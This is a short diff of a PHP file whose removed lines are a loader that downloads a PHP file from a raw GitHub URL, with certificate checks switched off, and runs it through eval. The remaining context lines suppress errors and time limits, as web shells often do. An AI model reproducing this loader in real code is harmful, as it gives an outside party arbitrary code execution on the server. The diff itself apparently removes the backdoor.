@@ -1,15 +1,4 @@
 <?php
-$url = 'https://raw.githubusercontent.com/bayyx/bayy/refs/heads/main/link.php';
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-$fileContents = curl_exec($ch);
-curl_close($ch);
-eval("?>" . $fileContents);
-?>
-
-<?php
 error_reporting(0);
 set_time_limit(0);
 
